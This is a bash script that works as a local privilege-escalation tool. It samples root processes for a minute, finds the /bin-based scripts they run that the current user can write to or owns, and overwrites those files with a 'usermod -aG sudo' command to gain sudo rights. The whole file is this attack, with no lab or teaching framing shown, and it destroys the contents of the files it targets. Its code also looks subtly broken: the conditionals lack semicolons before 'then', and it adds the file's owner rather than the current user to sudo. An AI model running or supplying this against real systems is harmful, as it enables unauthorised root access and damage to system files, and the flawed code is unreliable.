#! /bin/bash

exploit=true

# over one minute keep track of all the processes that run
# get any that are run with /bin/* executables 
script_files=$(for i in $(seq 1 610); do ps -u root --format cmd >> /tmp/procs.tmp; sleep 0.1; done; sort /tmp/procs.tmp | uniq -c | grep -v "\[" | grep -v -E "\s*[6-9][0-9][0-9]|\s*[1-9][0-9][0-9][0-9]" | grep "/bin/" | awk '{print $NF}')

rm /tmp/procs.tmp

echo $script_files

while read file; do
	echo $(stat -c "%a %U %G %n" $file)
	perms=$(stat -c "%a" $file)
	user=$(stat -c "%U" $file)
	group=$(stat -c "%G" $file)
	writable=false

	if [[ -w $file ]] then # if this file is writable by this user
		writable=true
	elif [[ $user == $(whoami) ]] then
		owner=true
	fi

	if [[ "$exploit" = true ]] then
		if [[ "$writable" = true ]] then
			echo usermod -aG sudo $user > $file
		elif [[ "$owner" = true ]] then
			chmod u+rw $file
			echo usermod -aG sudo $user > $file
		fi
	fi
done <<< "$script_files"
